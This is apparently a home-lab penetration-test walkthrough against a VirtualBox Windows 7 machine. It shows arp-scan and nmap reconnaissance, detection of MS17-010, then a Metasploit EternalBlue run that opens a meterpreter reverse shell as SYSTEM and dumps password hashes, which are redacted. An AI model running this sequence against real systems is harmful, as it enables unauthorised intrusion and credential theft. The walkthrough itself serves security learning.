# lets lookup all the ip in our network
```
 sudo arp-scan -I eth0 --localnet -ignoredups
```
```
Interface: eth0, type: EN10MB, MAC: 08:00:27:21:da:62, IPv4: 192.168.0.60
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     80:20:da:72:ff:d2       Sagemcom Broadband SAS
192.168.0.8     02:0f:b5:4a:c5:3c       (Unknown: locally administered)
192.168.0.18    68:54:5a:4c:27:b9       Intel Corporate
192.168.0.2     bc:14:ef:ed:09:cb       ITON Technology Limited
192.168.0.3     d4:f5:47:89:0e:44       Google, Inc.
192.168.0.16    44:27:45:51:57:76       (Unknown)
192.168.0.61    08:00:27:0b:50:a8       PCS Systemtechnik GmbH

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.091 seconds (122.43 hosts/sec). 7 responded
```
# lets check if the machine is online
```
 ping -c 1 192.168.0.61
```
```
PING 192.168.0.61 (192.168.0.61) 56(84) bytes of data.
64 bytes from 192.168.0.61: icmp_seq=1 ttl=128 time=0.705 ms

--- 192.168.0.61 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.705/0.705/0.705/0.000 ms
```
From the scan result we can confirm it is a windows machine
# lets look for the open ports
```
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.0.61 -oN openports
```
```
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5357/tcp  open  wsdapi       syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:0B:50:A8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
# lets check the what services and versions are running in the open ports
```
sudo nmap -sCV -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 -vvv 192.168.0.61 -oN script_versions_scan
```
```
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 128 Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:0B:50:A8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Host script results:
| smb2-time: 
|   date: 2025-04-21T17:05:01
|_  start_date: 2025-04-21T16:45:50
|_clock-skew: mean: 7h20m46s, deviation: 1h09m16s, median: 8h00m46s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-21T19:05:01+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0b:50:a8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   MIKE-PC<20>          Flags: <unique><active>
|   MIKE-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   08:00:27:0b:50:a8:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55948/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16160/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41397/udp): CLEAN (Timeout)
|   Check 4 (port 22500/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
# lets check for any vulnerabilities
```
sudo nmap --script vuln 192.168.0.61
```
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

```
# we can fire up the metasploit and look for anyexploits for the vulnerability
```
search ms17-010
```
```
search cve:CVE-2017-0143
```
Both of this search will take us to the same exploit which we can use to gain access into the target machine
```
Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
```
we will use this exploit 
```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-me
                                             tasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008
```
we just have to fill in the inofrmation that are required as yes and left empty
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.0.61
RHOSTS => 192.168.0.61
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.0.60:4444 
[*] 192.168.0.61:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.0.61:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.0.61:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.0.61:445 - The target is vulnerable.
[*] 192.168.0.61:445 - Connecting to target for exploitation.
[+] 192.168.0.61:445 - Connection established for exploitation.
[+] 192.168.0.61:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.61:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.0.61:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 192.168.0.61:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 192.168.0.61:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.0.61:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.61:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.61:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.61:445 - Starting non-paged pool grooming
[+] 192.168.0.61:445 - Sending SMBv2 buffers
[+] 192.168.0.61:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.61:445 - Sending final SMBv2 buffers.
[*] 192.168.0.61:445 - Sending last fragment of exploit packet!
[*] 192.168.0.61:445 - Receiving response from exploit packet
[+] 192.168.0.61:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.61:445 - Sending egg to corrupted connection.
[*] 192.168.0.61:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.0.61
[*] Meterpreter session 1 opened (192.168.0.60:4444 -> 192.168.0.61:49160) at 2025-04-21 19:44:46 +1000
[+] 192.168.0.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```
# we were able to gain access into the system and we got a shell which allows us to run command into the target machine
```
meterpreter > sysinfo
Computer        : MIKE-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrador:500:████████████████████████████████:████████████████████████████████:::
HomeGroupUser$:1002:████████████████████████████████:████████████████████████████████:::
Invitado:501:████████████████████████████████:████████████████████████████████:::
MIKE:1001:████████████████████████████████:████████████████████████████████:::
```







